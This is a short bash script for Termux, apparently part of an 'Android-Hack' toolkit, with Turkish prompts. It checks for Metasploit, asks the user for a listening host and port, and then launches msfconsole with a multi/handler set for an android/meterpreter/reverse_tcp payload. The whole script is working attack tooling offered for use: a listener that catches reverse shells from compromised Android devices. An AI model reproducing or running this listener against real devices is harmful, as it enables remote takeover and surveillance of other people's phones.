#!/bin/bash
##Author=UmuT_KaRa
clear
B="\e[0m"
K="\e[31m"
Y="\e[32m"
S="\e[33m"                                                                              M="\e[34m"
C="\e[36m"

kontrol () {
if [[ -a /data/data/com.termux/files/usr/bin/msfconsole ]];then
	dinleme
else
	echo
	echo
	echo
	printf "$K[$K!$K]$B LÜTFEN KURULUM YAPINIZ $K!!!"
	echo
	echo
	echo
	sleep 4
	cd ..
	bash Android-Hack.sh
fi

}

dinleme() {
########## DİNLEMEYE AL ##########

echo
echo
bash myip.sh
echo
echo
read -p $'\e[32mLHOST GİRİNİZ \e[31m────►  \e[0m' lhost
echo
echo
echo
echo
read -p $'\e[32mLPORT GİRİNİZ \e[31m────►  \e[0m' lport
echo
echo
echo
printf "[$Y*$B]$Y METASPLOİT FRAMEWORK AÇILIYOR.."
echo
echo
echo
sleep 2
msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; exploit;"
}
kontrol
